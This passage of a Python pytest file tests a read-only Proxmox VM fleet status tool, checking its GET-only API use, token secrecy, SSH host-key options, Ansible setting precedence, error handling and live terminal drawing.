        and alpha["root"]["total"] == 31 * 1024**3
        and alpha["os"]["pretty"] == "Ubuntu 24.04.3 LTS"
    )
    assert len([v for v in alpha["api"]["cpu_24h"] if v is not None]) == 12
    # beta was made just now: the fake's day of history for its VMID is another VM's, and none of it is drawn.
    assert len([v for v in model["vms"][1]["api"]["cpu_24h"] if v is not None]) <= 1
    assert alpha["created_ago"] == "2 d ago" and model["vms"][1]["created_ago"] in ("just now", "1 m ago")
    assert model["proxmox"]["version"] == "9.2.21" and model["template"]["name"] == "ubuntu-24.04-cloudinit"
    # The editor setting's default, by its key and its name, and the line under ACCESS.
    assert (model["settings"]["editor"], model["settings"]["editor_name"]) == ("vscode", "VS Code")
    assert " VS Code: just code <name> [--project <repo>] [--session <id>]" in T.status_text(model).split("\n")
    # What --json prints is this model, whole: every key 1.x promises is still there.
    held = {
        "report": model,
        "attention": model["attention"][0],
        "proxmox": model["proxmox"],
        "template": model["template"],
        "settings": model["settings"],
    }
    # Every VM, running or stopped, read or not.
    held |= {f"vm {vm['name']}": vm for vm in model["vms"]}
    missing = {part: sorted(PROMISED_KEYS[part.split()[0]] - set(keys)) for part, keys in held.items()}
    assert {part: keys for part, keys in missing.items() if keys} == {}
    # Read only: GETs, every one of them, and not one write.
    calls = _pve_requests(tmp_path)
    after_fixture = calls[[c["path"] for c in calls].index("/api2/json/cluster/resources") :]
    assert {c["method"] for c in after_fixture} == {"GET"}, {
        (c["method"], c["path"]) for c in after_fixture if c["method"] != "GET"
    }
    # The host key held: status's ssh options reach ssh first, whatever Ansible adds after them, as the stand-in ssh
    # recorded each call; ssh keeps the first value it is given, and test_status_vms has ssh -G resolve them.
    ssh_calls = [json.loads(line) for line in (tmp_path / "run" / "ssh.log").read_text().splitlines()]
    assert ssh_calls, "status never called ssh"
    for argv in ssh_calls:
        options = [argv[i + 1] for i, arg in enumerate(argv) if arg == "-o"]
        # Given none, no port and no key: ssh's own, and whatever the user's config says of the host.
        assert "-p" not in argv and "-i" not in argv, argv
        for name, value in (
            ("stricthostkeychecking", "StrictHostKeyChecking=yes"),
            ("updatehostkeys", "UpdateHostKeys=no"),
        ):
            given = [option for option in options if option.lower().startswith(name + "=")]
            assert given and given[0] == value, argv


@pytest.mark.parametrize(("editor", "name"), [("zed", "Zed"), ("", "VS Code")])
def test_the_access_line_names_the_editor_set(tmp_path, fake_pve, editor: str, name: str) -> None:
    # The setting as local.yml holds it, through the engine's settings and status_report's model into the text; an
    # empty one is the default's, as code.yml resolves it, and never "" in --json.
    report, model = _status_run(tmp_path, fake_pve, settings={"editor": editor})
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert (model["settings"]["editor"], model["settings"]["editor_name"]) == (editor or "vscode", name)
    assert f" {name}: just code <name> [--project <repo>] [--session <id>]" in T.status_text(model).split("\n")


def test_a_template_carrying_the_ownership_tag_is_no_vm_of_the_report(tmp_path, fake_pve) -> None:
    # A VM of the fleet made a template by hand, as one cloned in place of the base may be: no VM of the fleet, as
    # claude_vm_tagged has it for every playbook.
    _pve_vm(fake_pve, 9013, "made-a-template", tags="agent-warehouse")
    _pve(fake_pve, "POST", "nodes/pve/qemu/9013/template")
    report, model = _status_run(tmp_path, fake_pve, "--only", "vms")
    assert report["rc"] == 0, report["stderr"][-2000:]
    # The fake's nameless VM on its node that is down comes after these three.
    names = [vm["name"] for vm in model["vms"]]
    assert names[:3] == ["alpha", "beta", "gamma"] and "made-a-template" not in names, names
    # Nor read: nothing of it is asked of Proxmox after the listing.
    calls = _pve_requests(tmp_path)
    after = calls[[c["path"] for c in calls].index("/api2/json/cluster/resources") :]
    assert not [c["path"] for c in after if "/qemu/9013/" in c["path"]], after


@pytest.mark.parametrize("custom", ["", "ubuntu-24.04-cloudinit"])
def test_a_template_of_your_own_is_compared_with_nothing(tmp_path, fake_pve, custom: str) -> None:
    # The fake's template is on vmbr0, which the settings no longer ask for: the project's own is to be rebuilt, and
    # one named as yours (proxmox_template_custom) is left as it is, as deploy leaves it.
    settings = {"proxmox_bridge": "vmbr9", "proxmox_template_custom": custom}
    report, model = _status_run(tmp_path, fake_pve, "--only", "storage", settings=settings)
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert model["template"]["name"] == "ubuntu-24.04-cloudinit" and model["template"].get("vmid") == 9000
    assert bool(model["template"]["drift"]) == (not custom), model["template"]


def test_a_proxmox_that_refuses_the_token_is_said_not_failed(tmp_path, fake_pve) -> None:
    report, model = _status_run(tmp_path, fake_pve, settings={"vault_proxmox_api_token_secret": "wrong"})
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert model["exit"] == 2
    item = model["attention"][0]
    assert item["level"] == "unread" and item["text"].startswith("Proxmox refused the token: ")
    assert "proxmox_api_token_id" in item["command"]


def test_a_token_refused_a_vm_s_address_names_the_privileges_and_reaches_no_vm(tmp_path, fake_pve) -> None:
    # The fake's "noagent" token may read everything but the guest agent, as one made without its privilege.
    report, model = _status_run(tmp_path, fake_pve, settings={"proxmox_api_token_id": "noagent"}, timeout=60)
    assert report["rc"] == 0, report["stderr"][-2000:]
    item = model["attention"][0]
    assert model["exit"] == 2 and item["level"] == "unread"
    assert item["text"].startswith('Proxmox refused the API token for VM "') and "VM.GuestAgent.Audit" in item["text"]
    assert "privileges" in item["command"] and "proxmox_api_host" not in item["command"]
    assert not (tmp_path / "run" / "ssh.log").exists()


def test_a_vm_of_the_listing_is_reached_with_the_inventory_s_ssh_options_port_and_key(tmp_path, fake_pve) -> None:
    # A jump host, a port and a key every host is given, and a VM's own host_vars file, reach the VMs as deploy's and
    # login's runs reach them - after status's own host key options, which ssh keeps since they come first.
    host_vars = tmp_path / "run" / "host_vars"
    host_vars.mkdir(parents=True)
    (host_vars / "beta.yml").write_text("ansible_port: 2200\n")
    pinned = {
        "ansible_ssh_common_args": "-o ProxyJump=jump.invalid",
        "ansible_port": 2222,
        "ansible_ssh_private_key_file": "/nonexistent/key",
    }
    report, _ = _status_run(tmp_path, fake_pve, settings=pinned)
    assert report["rc"] == 0, report["stderr"][-2000:]
    calls = [json.loads(line) for line in (tmp_path / "run" / "ssh.log").read_text().splitlines()]
    ports = {}
    for argv in calls:
        options = [argv[i + 1] for i, arg in enumerate(argv) if arg == "-o"]
        assert options.index("StrictHostKeyChecking=yes") < options.index("ProxyJump=jump.invalid"), argv
        assert argv[argv.index("-i") + 1] == "/nonexistent/key", argv
        ports[argv[-2]] = argv[argv.index("-p") + 1]
    assert ports.pop("192.0.2.60") == "2222" and set(ports.values()) == {"2200"}, calls


def test_what_ansible_s_configuration_or_environment_gives_every_host_reaches_the_vms(tmp_path, fake_pve) -> None:
    # The same settings a run of any other recipe takes from there, where the inventory says nothing.
    root = status_root(tmp_path, fake_pve)
    env = _env(
        root,
        ANSIBLE_SSH_COMMON_ARGS="-o ProxyJump=jump.invalid",
        ANSIBLE_PRIVATE_KEY_FILE="/nonexistent/key",
        ANSIBLE_REMOTE_PORT="2222",
    )
    done = subprocess.run(
        status_command(root, {}, "--json"),
        cwd=root,
        env=env,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    assert done.returncode in (0, 1, 2), done.stderr[-2000:]
    calls = [json.loads(line) for line in (root / "ssh.log").read_text().splitlines()]
    assert calls
    for argv in calls:
        options = [argv[i + 1] for i, arg in enumerate(argv) if arg == "-o"]
        assert options.index("StrictHostKeyChecking=yes") < options.index("ProxyJump=jump.invalid"), argv
        assert argv[argv.index("-i") + 1] == "/nonexistent/key" and argv[argv.index("-p") + 1] == "2222", argv


def test_a_key_given_on_the_command_line_reaches_the_vms_as_ansible_ranks_it(tmp_path, fake_pve) -> None:
    # Over ansible.cfg's and the environment's, as ansible-playbook takes it; under the inventory's own.
    root = status_root(tmp_path, fake_pve)
    done = subprocess.run(
        status_command(root, {}, "--json", "--private-key", "/nonexistent/given"),
        cwd=root,
        env=_env(root, ANSIBLE_PRIVATE_KEY_FILE="/nonexistent/environment"),
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    assert done.returncode in (0, 1, 2) and "ignoring" not in done.stderr, done.stderr[-2000:]
    calls = [json.loads(line) for line in (root / "ssh.log").read_text().splitlines()]
    assert calls and {argv[argv.index("-i") + 1] for argv in calls} == {"/nonexistent/given"}
    pinned = {"ansible_ssh_private_key_file": "/nonexistent/inventory"}
    other = tmp_path / "inventory-names-one"
    report, _ = _status_run(other, fake_pve, "--private-key", "/nonexistent/given", settings=pinned)
    assert report["rc"] == 0, report["stderr"][-2000:]
    calls = [json.loads(line) for line in (other / "run" / "ssh.log").read_text().splitlines()]
    assert calls and {argv[argv.index("-i") + 1] for argv in calls} == {"/nonexistent/inventory"}


def test_the_proxmox_host_s_address_may_be_in_a_host_vars_file_of_its_own(tmp_path, fake_pve) -> None:
    # proxmox_api_host reads hostvars as a play sees them. From the inventory file's text alone, the host's bare name
    # would be asked for instead, with the API token.
    root = status_root(tmp_path, fake_pve)
    fake_api = root / "group_vars" / "all" / "fake_api.yml"
    pinned = yaml.safe_load(fake_api.read_text())
    del pinned["proxmox_api_host"]
    fake_api.write_text(yaml.safe_dump(pinned))
    inventory = root / "hosts.yml"
    inventory.write_text(
        yaml.safe_dump({"proxmox": {"hosts": {"pve": None}}, "claude_vms": {"vars": {"vm_user": "dev"}}})
    )
    (root / "host_vars").mkdir()
    (root / "host_vars" / "pve.yml").write_text("ansible_host: 127.0.0.1\n")
    done = subprocess.run(
        [sys.executable, str(STATUS), "-i", str(inventory), "--json"],
        cwd=root,
        env=_env(root),
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    assert done.returncode in (0, 1, 2), done.stderr[-2000:]
    assert json.loads(done.stdout)["vms"][0]["api"]["read"]


def test_a_log_it_cannot_write_is_said_and_the_run_goes_on(tmp_path, fake_pve) -> None:
    # A traceback here would exit 1, which the report's codes keep for a problem found on a VM.
    root = status_root(tmp_path, fake_pve)
    done = subprocess.run(
        status_command(root, {}, "--json"),
        cwd=root,
        env=_env(root, ANSIBLE_LOG_PATH=str(tmp_path / "no" / "such" / "folder" / "status.log")),
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    assert done.returncode in (0, 1, 2) and json.loads(done.stdout)["vms"], done.stderr[-2000:]
    assert "just status cannot write its log" in done.stderr


def test_sigterm_ends_a_run_whose_sigint_was_inherited_ignored(tmp_path, fake_pve) -> None:
    # A run started with & in a script has SIGINT ignored: SIGTERM, taken as a Ctrl-C, must not be ignored with it.
    root = status_root(tmp_path, fake_pve)
    (root / "ssh-holds").touch()

    def ignored():
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        signal.signal(signal.SIGTERM, signal.SIG_DFL)

    process = subprocess.Popen(
        status_command(root, {}, "--json"),
        cwd=root,
        env=_env(root),
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        preexec_fn=ignored,
    )
    try:
        deadline = time.monotonic() + 60
        while not (root / "ssh.log").exists():
            assert process.poll() is None and time.monotonic() < deadline, "no probe started"
            time.sleep(0.05)
        process.send_signal(signal.SIGTERM)
        _, said = process.communicate(timeout=20)
    finally:
        (root / "ssh-holds").unlink()
        if process.poll() is None:
            process.kill()
            process.communicate()
    assert process.returncode == 3 and "interrupted" in said, said[-2000:]


# Runs tools/status with the model's reading of a VM's Proxmox reads failing, as a bug or an answer nobody expected
# would: what the run does when it fails part way.
FAILING = """
import runpy, sys
sys.path.insert(0, {lib!r})
from claude_vm.status import model


def failing(*args, **kwargs):
    raise RuntimeError("a read nobody expected")


model.status_vm_api = failing
sys.argv = [{status!r}, *sys.argv[1:]]
runpy.run_path({status!r}, run_name="__main__")
"""


def test_a_run_that_fails_part_way_ends_its_probes_and_exits_at_once(tmp_path, fake_pve) -> None:
    root = status_root(tmp_path, fake_pve)
    # Every probe held, as a VM still being read: the run must not wait for one.
    (root / "ssh-holds").touch()
    script = tmp_path / "failing.py"
    script.write_text(FAILING.format(lib=str(REPO / "lib"), status=str(STATUS)))
    argv = [sys.executable, str(script), *status_command(root, {}, "--json")[2:]]
    started = time.monotonic()
    try:
        done = subprocess.run(
            argv,
            cwd=root,
            env=_env(root),
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=90,
            check=False,
        )
    finally:
        (root / "ssh-holds").unlink()
    assert done.returncode == 3, done.stderr[-2000:]
    assert "the run failed: a read nobody expected" in done.stderr
    assert time.monotonic() - started < 45


@pytest.mark.parametrize("flag", ["--ask-vault-pass", "--ask-vault-password", "-J"])
def test_asking_for_the_vault_s_password_is_refused_by_name_before_anything_runs(tmp_path, flag: str) -> None:
    # Warned of and ignored like other options, the run would end later in Ansible's own words for a vault it cannot
    # open. Status draws at once and asks nothing, so it says where the password goes instead.
    root = status_root(tmp_path, "https://127.0.0.1:9")
    done = subprocess.run(
        status_command(root, {}, flag),
        cwd=root,
        env=_env(root),
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    assert done.returncode == 3 and done.stdout == "", done.stderr[-2000:]
    assert ".vault_pass" in done.stderr and "ANSIBLE_VAULT_PASSWORD_FILE" in done.stderr
    assert "refused" in done.stderr and "ignoring" not in done.stderr
    assert not (root / "ssh.log").exists()


def test_a_token_secret_ending_in_a_newline_is_sent_without_it_and_never_said(tmp_path, fake_pve) -> None:
    # A vault edited by hand: both HTTP clients refuse a header with a newline, quoting it whole - escaped, so
    # no_log's masking missed the secret in it.
    report, model = _status_run(tmp_path, fake_pve, settings={"vault_proxmox_api_token_secret": PVE_SECRET + "\n"})
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert model["vms"][0]["api"]["read"]
    assert PVE_SECRET not in json.dumps(report)


def test_a_proxmox_that_does_not_answer_is_said_not_failed(tmp_path) -> None:
    report, model = _status_run(tmp_path, "https://127.0.0.1:9", settings={"status_api_timeout": 2})
    assert report["rc"] == 0, report["stderr"][-2000:]
    item = model["attention"][0]
    assert model["exit"] == 2 and item["vm"] == "proxmox" and item["text"].startswith("Proxmox did not answer: ")
    assert "proxmox_api_host" in item["command"]


def test_a_name_that_matches_no_vm_is_not_read(tmp_path, fake_pve) -> None:
    report, model = _status_run(tmp_path, fake_pve, "-e", json.dumps({"vm_name": "alpha,gama"}))
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert [vm["name"] for vm in model["vms"]] == ["alpha"]
    assert any(it["vm"] == "gama" and it["level"] == "unread" for it in model["attention"])


def test_proxmox_ve_8_reads_as_9_does_without_what_8_has_not(tmp_path) -> None:
    # Proxmox VE 8 keeps a point every twenty minutes, and neither memhost nor pressure.
    for base in fake_fleet(tmp_path, version="8.2.4"):
        report, model = _status_run(tmp_path, base)
        assert report["rc"] == 0, report["stderr"][-2000:]
        alpha = model["vms"][0]
        assert model["proxmox"]["version"] == "8.2.4"
        assert alpha["api"]["read"] and alpha["api"]["pressure_1h"] is None
        assert len([v for v in alpha["api"]["cpu_24h"] if v is not None]) == 12


def test_settings_that_differ_from_the_vm_are_a_thing_to_do(tmp_path, fake_pve) -> None:
    report, model = _status_run(tmp_path, fake_pve, settings={"vm_cores": 4})
    assert report["rc"] == 0, report["stderr"][-2000:]
    items = [it for it in model["attention"] if it["vm"] == "alpha" and "the settings ask for 4 cores" in it["text"]]
    assert items and "proxmox_vm_force_update" in items[0]["command"]


# ------------------------------------------------------------------------------------ what it can do ----


def test_the_engine_sends_nothing_but_gets_and_follows_no_redirect() -> None:
    # The token is in the header of every request: never carried to an address a redirect names.
    source = inspect.getsource(engine)
    assert source.count("urllib.request.Request(") == 1 and 'method="GET"' in source
    assert "data=" not in source
    tree = ast.parse(source)
    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and getattr(n.func, "attr", "") == "Request"]
    assert [k.value.value for call in calls for k in call.keywords if k.arg == "method"] == ["GET"]
    assert "_NoRedirect" in source and "def redirect_request" in source


def test_no_token_is_written_into_what_is_kept_or_said(tmp_path, fake_pve) -> None:
    report, _ = _status_run(tmp_path, fake_pve)
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert PVE_SECRET not in report["stdout"] and PVE_SECRET not in report["stderr"]
    assert not list(tmp_path.glob("run/**/settings.json"))


def test_the_roles_lines_are_the_ones_configure_gives() -> None:
    # status shows the line a role's own report gives and records for NEXT STEPS, one function both call, never one
    # of its own making.
    assert "github_projects_login_report.line" in (REPO / "roles/github_projects/tasks/login_report.yml").read_text()
    assert "tailscale_report_result.line" in (REPO / "roles/tailscale/tasks/report.yml").read_text()
    found = (REPO / "lib/claude_vm/status/found.py").read_text()
    assert "github_login_report(" in found and "tailscale_report(" in found
    login = yaml.safe_load((REPO / "roles" / "github_projects" / "tasks" / "login.yml").read_text())
    assert [t.get("ansible.builtin.include_tasks") for t in login if "ansible.builtin.include_tasks" in t][-1] == (
        "login_report.yml"
    )


def test_every_status_run_in_a_test_writes_into_its_own_directory() -> None:
    # Never the developer's ~/.ssh, and no ssh of this machine's: the unit runs go through status_root, and a run
    # with no --cache keeps nothing anywhere. Every run in a scenario goes through the one task file.
    source = inspect.getsource(status_root)
    assert '"claude_ssh_config_file": str(tmp_path' in source
    assert '"ansible_ssh_executable": str(root / "ssh")' in source and '"ansible_control_path_dir"' in source
    assert "--cache" not in inspect.getsource(status_command)
    for path in (REPO / "tests" / "unit").glob("test_*.py"):
        text = path.read_text()
        # test_ratchets.py names the file a table counts lines of, and test_controller_writes.py one that only reads the
        # SSH config; neither runs anything. The MCP tests and test_hosts.py name it as what their stand-in python
        # answers, in its place.
        skipped = (
            "test_status.py",
            "test_justfile.py",
            "test_ratchets.py",
            "test_controller_writes.py",
            "test_mcp_server.py",
            "test_mcp_confirm.py",
            "test_mcp_hosts.py",
            "test_hosts.py",
        )
        if path.name not in skipped and "tools/status" in text:
            assert "status_root" in text, path.name
    uses = 0
    for path in (REPO / "molecule").glob("*/*.yml"):
        for play in yaml.safe_load(path.read_text()) or []:
            for task in (play.get("tasks") or []) if isinstance(play, dict) else []:
                if str(task.get("ansible.builtin.include_tasks", "")).endswith("status_report.yml"):
                    uses += 1
    assert uses == 4


# ------------------------------------------------------------------------------------------------- the screen ----


class _Terminal(io.StringIO):
    encoding = "utf-8"

    def isatty(self):
        return True


@pytest.fixture
def drawn(monkeypatch):
    """Makes the screen at a stand-in terminal, its spinner off, and empties the terminal of the outline. Called from
    the test itself: pytest puts its own sys.stdout back between a fixture's setup and the test, and the screen writes
    where sys.stdout is."""
    made = []
    # The region turns the echo off on stdin when it is a terminal: under pytest -s it would be the developer's.
    monkeypatch.setattr(sys, "stdin", io.StringIO())
    monkeypatch.setattr(engine.live.Output, "spin", lambda self: None)
    handler = signal.getsignal(signal.SIGWINCH)

    def make(quiet=False, log=""):
        monkeypatch.setenv("TERM", "xterm-256color")
        monkeypatch.delenv("NO_COLOR", raising=False)
        monkeypatch.setenv("ANSIBLE_NOCOLOR", "1")
        terminal = _Terminal()
        monkeypatch.setattr(sys, "stdout", terminal)
        drew = engine.Screen(list(S.SECTIONS), quiet, log)
        if drew.out.live:
            drew.out.region._terminal_size = lambda: (100, 60)
        drew.out.redraw()
        terminal.seek(0)
        terminal.truncate()
        made.append(drew)
        return drew, terminal

    yield make
    for drew in made:
        if drew.out.live:
            drew.out.region._stop.set()
    signal.signal(signal.SIGWINCH, handler)


def test_the_outline_is_drawn_before_anything_has_been_read(monkeypatch) -> None:
    # Every section's title, a spinner each, from the first frame: there is no moment with nothing on the screen.
    monkeypatch.setattr(sys, "stdin", io.StringIO())
    monkeypatch.setattr(engine.live.Output, "spin", lambda self: None)
    monkeypatch.setenv("TERM", "xterm-256color")
    terminal = _Terminal()
    monkeypatch.setattr(sys, "stdout", terminal)
    handler = signal.getsignal(signal.SIGWINCH)
    drew = engine.Screen(list(S.SECTIONS), False, "")
    drew.out.region._terminal_size = lambda: (100, 60)
    drew.out.redraw()
    said = terminal.getvalue()
    drew.out.region._stop.set()
    signal.signal(signal.SIGWINCH, handler)
    for title in ("VMS", "STORAGE", "CAPACITY", "ACCESS", "SIGN-INS", "SYSTEM", "WORK", "ATTENTION"):
        assert title in said, title
    assert "listing the VMs" in said


def test_the_region_is_redrawn_in_place_and_erased_for_the_finished_report(drawn) -> None:
    drew, terminal = drawn()
    fleet = _fleet()
    drew.land("localhost", {"fleet": fleet})
    # The tab's title first (OSC 0), what it is reading; then the region.
    title, first = re.match(r"\x1b\]0;([^\x07]*)\x07(.*)", terminal.getvalue(), re.S).groups()
    assert title == "status · reading 2 VMs"
    assert "VMS" in first and "⠋" in first and first.startswith("\x1b[?2026h")
    drew.land("alpha", {"api": {"read": True, "state": "running", "root": None, "pending": []}})
    # Moved up exactly the lines drawn before, then the whole region again, in one write.
    drawn_lines = first.count("\n") + 1
    assert re.sub(r"\x1b\]0;[^\x07]*\x07", "", terminal.getvalue())[len(first) :].startswith(
        f"\x1b[?2026h\x1b[{drawn_lines - 1}A\r"
    )
    model = S.status_report({"localhost": {"fleet": fleet}}, "now")
    terminal.seek(0)
    terminal.truncate()
    drew.finish(model)
    # The tab says the report is done, then the region is erased for the report.
    assert terminal.getvalue().startswith("\x1b]0;status · done\x07")
    out = re.sub(r"\x1b\]0;[^\x07]*\x07", "", terminal.getvalue())
    assert out.startswith("\x1b[") and "\r\x1b[J" in out.split("agent-warehouse")[0]
    assert out.rstrip().split("\n")[-1].startswith("exit 2")
    assert "⠋" not in out.split("\x1b[J", 1)[1]


def test_a_live_line_is_cut_to_the_width_and_the_region_to_the_height(drawn) -> None:
    drew, terminal = drawn()
    # A window this size from the start: the outline was drawn at the fixture's, and a change of size pushes the screen.
    drew.out.region._terminal_size = lambda: (40, 8)
    drew.out.region._size = None
    drew.land("localhost", {"fleet": _fleet()})
    frame = (
        re.sub(r"\x1b\]0;[^\x07]*\x07", "", terminal.getvalue()).replace("\x1b[?2026h", "").replace("\x1b[?2026l", "")
    )
    lines = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", frame).replace("\r", "").split("\n")
    assert len(lines) <= 7
    assert max(len(line) for line in lines) <= 39
    assert any(line.startswith("⋮") and "more lines, shown when" in line for line in lines)


def test_a_resize_pushes_the_screen_into_the_scrollback_and_starts_afresh(drawn) -> None:
    drew, terminal = drawn()
    drew.land("localhost", {"fleet": _fleet()})
    terminal.seek(0)
    terminal.truncate()
    drew.out.region._resized = True
    drew.out.region._terminal_size = lambda: (80, 30)
    drew.out.region.redraw()
    assert terminal.getvalue().startswith("\n" * 30 + "\x1b[29A\r")


def test_the_screen_writes_no_other_escape_than_its_own(drawn) -> None:
    drew, terminal = drawn()
    drew.color = True
    drew.out.color = True
    fleet = _fleet()
    drew.land("localhost", {"fleet": fleet})
    drew.out.region._resized = True
    drew.out.region.redraw()
    drew.finish(S.status_report({"localhost": {"fleet": fleet}}, "now"))
    assert "\x1b[1;36mVMS" in terminal.getvalue()
    escapes = set(re.findall(r"\x1b\[[0-9;?]*[A-Za-z]", terminal.getvalue())) - set(
        re.findall(r"\x1b\[[0-9;]*m", terminal.getvalue())
    )
    # Colours, up, erase to the end of the line, erase below, synchronized output: never one that hides the cursor.
    assert escapes <= {"\x1b[K", "\x1b[J", "\x1b[?2026h", "\x1b[?2026l"} | {
        e for e in escapes if re.fullmatch(r"\x1b\[\d+A", e)
    }


def test_under_json_nothing_is_drawn_and_the_report_goes_to_the_log_alone(drawn, tmp_path) -> None:
    # The log of a just status --json was an empty file, which read as a run that failed before it began.
    log = tmp_path / "run.log"
    drew, terminal = drawn(quiet=True, log=str(log))
    fleet = _fleet()
    drew.land("localhost", {"fleet": fleet})
    drew.finish(S.status_report({"localhost": {"fleet": fleet}}, "now"))
    assert terminal.getvalue() == ""
    said = log.read_text()
    assert "| agent-warehouse" in said and "VMS" in said


# ------------------------------------------------------------------------------------- every state at once ----

G = 1024**3
RUNNING_RC = {"LoadState": "loaded", "ActiveState": "active", "SubState": "running", "NRestarts": "0"}
DOWN_RC = {
    "LoadState": "loaded",
    "ActiveState": "failed",
    "SubState": "failed",
    "NRestarts": "5",
    "StateChangeTimestamp": "Sat 2027-01-15 05:00:00 UTC",
}


def _claude(**kw):
    return {
        "installed": True,
        "version": "2.1.310",
        "login_stored": True,
        "api_key": False,
        "remote_control_wanted": True,
        "service": RUNNING_RC,
        "path_unit": {},
        "login_command": "just login x --only claude",
        "unit": "claude-remote-control",
        **kw,
    }


SYSTEM = {
    "os": "Ubuntu 24.04.3 LTS",
    # Ubuntu's ABI numbers run to three digits: 6.8.0-142 with 6.8.0-147 waiting cut the column once.
    "kernel": "6.8.0-142-generic",
    "kernel_newest": "6.8.0-147-generic",
    "reboot_required": True,
    "reboot_packages": ["linux-image-6.8.0-87-generic"],
    "load": [12.42, 9.31, 8.2],
    "upgrades": 123,
    "security": 45,
    "claude": 12,
    "vscode_windows": 3,
    "editor_windows": 5,
    "editor_windows_by": {"vscode": 3, "zed": 2},
    "unread": {"upgrades": "it took longer than 20 s"},
}
TAILSCALE = {
    "enabled": True,
    "installed": True,
    "ours": True,
    "daemon_up": True,
    "backend": "Running",
    "case": "Running",
    "dns_name": "a-machine-name-that-is-rather-long.tailnet-example-with-a-long-name.ts.net",
    "ipv4": "100.100.100.100",
    "line": "",
    "left": False,
}
GITHUB = {
    "installed": True,
    "readable": True,
    "signed_in": False,
    "unchecked": False,
    "account": "",
    "managed": True,
    "line": "not signed in to GitHub, so only public repositories are cloned and git push fails there. Run just login"
    " x --only github to sign in by the device flow; that run clones the private repositories too.",
    "left": True,
}
WORK = {
    "dir": "/srv/a/projects/directory/with/a/long/path",
    "checkouts": 123,
    "worktrees": 45,
    "repositories": [
        {
            "name": "a-repository-with-a-long-name",
            "worktrees": 3,
            "commits_on_no_remote": 1234,
            "branches_on_no_remote": 56,
            "detached_commits": 7,
            "dirty_worktrees": 3,
            "stashes": 9,
        },
        {
            "name": "another",
            "worktrees": 1,
            "commits_on_no_remote": 0,
            "branches_on_no_remote": 0,
            "detached_commits": 0,
            "dirty_worktrees": 1,
            "stashes": 0,
        },
    ],
}
# One VM per way a VM can be over SSH: each, with every other at its widest, in one report.
SSH_STATES = {
    "fine": {"claude": _claude(), "github": dict(GITHUB, signed_in=True, account="octocat", left=False)},
    "rc-down": {"claude": _claude(service=DOWN_RC)},
    "rc-waits": {
        "claude": _claude(
            login_stored=False,
            service={"LoadState": "loaded", "ActiveState": "inactive"},
            path_unit={"ActiveState": "active"},
        )
    },
    "rc-off": {"claude": _claude(api_key=True, remote_control_wanted=False)},
    "rc-unset": {"claude": _claude(service={"LoadState": "not-found"})},
    "rc-stopped": {"claude": _claude(service={"LoadState": "loaded", "ActiveState": "inactive"})},
    "no-claude": {"claude": _claude(installed=False, version="")},
    "gh-unchecked": {"github": dict(GITHUB, unchecked=True, error='Get "https://api.github.com/": no such host')},
    "gh-old": {"github": dict(GITHUB, readable=False)},
    "gh-alone": {"github": dict(GITHUB, managed=False, left=False)},
    "ts-down": {"tailscale": dict(TAILSCALE, case="check-daemon-down", backend="", dns_name="")},
    "ts-none": {"tailscale": dict(TAILSCALE, case="check-no-package", backend="", dns_name="")},
    "ts-join": {"tailscale": dict(TAILSCALE, case="would-join", backend="NeedsLogin", dns_name="")},
    "ts-page": {
        "tailscale": dict(
            TAILSCALE,
            case="page-pending",
            backend="NeedsLogin",
            dns_name="",
            left=True,
            line="not signed in to Tailscale yet - the page stays valid for 7 days and x joins by itself"
            " once you approve it; just login x --only tailscale gives a fresh page.",
        )
    },
    "unread": {"unread": {"system": "x", "claude": "y", "github": "z", "tailscale": "w", "work": "v"}},
}
REFUSED = {
    "key-changed": "@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @ Host key verification failed.",
    "key-unknown": "No ED25519 host key is known for x and you have requested strict checking.",
    "timed-out": "ssh: connect to host x port 22: Operation timed out",
    "refused": "ssh: connect to host x port 22: Connection refused",
    "denied": "dev@x: Permission denied (publickey).",
    "other": "kex_exchange_identification: read: Connection reset by peer",
}


def _every_state():
    """A report holding every state status can say, each VM's name as long as a recipe takes."""
    listing, found = [], {}
    names = list(SSH_STATES) + [f"no-ssh-{k}" for k in REFUSED]
    for i, name in enumerate(names):
        vmname = f"{name}-with-a-name-long-enough-to-cut"
        listing.append(
            {
                "vmid": 1000 + i,
                "name": vmname,
                "node": "pve",
                "type": "qemu",
                "status": "running",
                "tags": "agent-warehouse",
                "maxcpu": 128,
                "maxmem": 1024 * G,
                "mem": 999 * G,
                "cpu": 1.0,
                "uptime": 9_999_999,
                "maxdisk": 4096 * G,
            }
        )
        if name.startswith("no-ssh-"):
            said = REFUSED[name[len("no-ssh-") :]]
            ssh = {"reached": False, "unreachable": said, "refusal": S.status_refusal(said), "unread": {}}
        else:
            parts = SSH_STATES[name]
            ssh = {
                "reached": True,
                "unreachable": "",
                "refusal": "",
                "system": SYSTEM,
                "claude": parts.get("claude", _claude()),
                "github": parts.get("github", GITHUB),
                "tailscale": parts.get("tailscale", TAILSCALE),
                "work": WORK,
                "unread": parts.get("unread", {}),
            }
        found[vmname] = {
            "api": {
                "read": True,
                "state": "running",
                "cpu_24h": [1.0] * 12,
                "pressure_1h": 0.5,
                "pending": ["memory"],
                "root": {"used": 950 * G, "total": 1000 * G},
            },
            "drift": {"hardware": [{"setting": "cores", "wanted": 64, "has": 128}], "cloud_init": ["SSH keys", "DNS"]},
            "ssh": ssh,
        }
    tagged = listing
    fleet = S.status_fleet(
        listing,
        tagged=tagged,
        requested=tagged,
        addressed=[dict(e, address=f"192.0.2.{100 + i}") for i, e in enumerate(listing)],
        settings={**SETTINGS, "vm_user": "a-long-user-name", "names": []},
        aliases=[],
    )
